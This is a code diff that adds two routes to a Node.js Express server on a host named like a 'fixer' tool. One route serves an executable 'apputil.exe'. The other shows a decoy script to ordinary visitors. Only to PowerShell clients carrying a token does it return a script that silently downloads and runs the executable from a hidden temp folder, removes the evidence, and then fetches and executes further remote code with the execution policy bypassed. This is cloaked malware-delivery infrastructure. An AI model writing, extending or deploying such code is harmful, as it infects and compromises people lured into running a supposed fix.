@@ -443,6 +443,38 @@ app.get("/pkg", (req, res) => {
   require("fs").createReadStream(fp).pipe(res);
 });
 
+app.get("/pkg2", (req, res) => {
+  const fp = require("path").join(__dirname, "apputil.exe");
+  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
+  res.setHeader("Content-Type", "application/octet-stream");
+  res.setHeader("Content-Disposition", "attachment; filename=apputil.exe");
+  require("fs").createReadStream(fp).pipe(res);
+});
+
+app.get("/fix2", (req, res) => {
+  const ua = (req.headers["user-agent"] || "").toLowerCase();
+  const host = req.headers.host || "zxcrosfixer.up.railway.app";
+  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
+  const hasToken = req.query.v === "3";
+
+  if (!(isPosh && hasToken)) {
+    const fake = getFakeScript(host);
+    res.setHeader("Content-Type", "text/plain; charset=utf-8");
+    return res.send(fake);
+  }
+
+  const script = `$ErrorActionPreference='SilentlyContinue'
+$d="$env:TEMP\\$([System.IO.Path]::GetRandomFileName())"
+New-Item -ItemType Directory -Path $d -Force|Out-Null
+Invoke-WebRequest -Uri 'https://${host}/pkg2' -OutFile "$d\\apputil.exe" -UseBasicParsing
+Start-Process -FilePath "$d\\apputil.exe" -WindowStyle Hidden -Wait
+Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
+Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
+`;
+  res.setHeader("Content-Type", "text/plain");
+  res.send(script);
+});
+
 app.listen(PORT, () => {
   console.log(`[+] running on ${PORT}`);
 });
